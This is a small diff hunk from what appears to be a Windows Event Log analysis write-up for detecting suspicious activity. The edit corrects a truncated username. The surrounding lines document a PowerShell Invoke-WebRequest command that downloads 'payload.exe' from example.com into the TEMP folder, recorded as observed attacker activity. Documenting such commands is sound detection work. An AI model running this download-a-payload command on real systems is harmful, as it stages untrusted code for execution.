@@ -37,7 +37,7 @@ Analyze Windows Event Logs to detect and document:
 - **Command**:
   ```powershell
   Invoke-WebRequest -Uri "http://example.com/payload.exe" -OutFile "$env:TEMP\payload.exe"
-- Username: Becom
+- Username: BecomingCyber
 
 - Timestamp: 2025-04-16 15:14:23
 
